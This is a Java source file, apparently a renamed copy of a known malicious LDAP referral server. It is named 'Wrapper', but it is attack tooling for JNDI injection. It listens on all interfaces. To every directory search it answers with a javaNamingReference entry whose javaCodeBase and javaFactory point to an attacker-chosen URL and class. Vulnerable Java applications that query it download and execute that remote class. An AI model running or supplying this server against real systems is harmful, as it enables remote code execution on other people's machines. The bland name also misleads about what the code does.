package com.jdmaxcorp.wrapper;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

public class Wrapper {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public Wrapper() {
    }

    public static void main(String[] args) {
        int port = -1;
        if (args.length >= 1 && args[0].indexOf(35) >= 0) {
            String portStr = System.getProperty("port", "1389");
            port = Integer.parseInt(portStr);
        } else {
            System.err.println(Wrapper.class.getSimpleName() + " <codebase_url#classname> [<port>]");
            System.exit(-1);
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(new String[]{"dc=example,dc=com"});
            config.setListenerConfigs(new InMemoryListenerConfig[]{new InMemoryListenerConfig("listen", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory)SSLSocketFactory.getDefault())});
            config.addInMemoryOperationInterceptor(new Wrapper.OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        } catch (Exception var4) {
            var4.printStackTrace();
        }

    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);

            try {
                this.sendResult(result, base, e);
            } catch (Exception var5) {
                var5.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf(35);
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
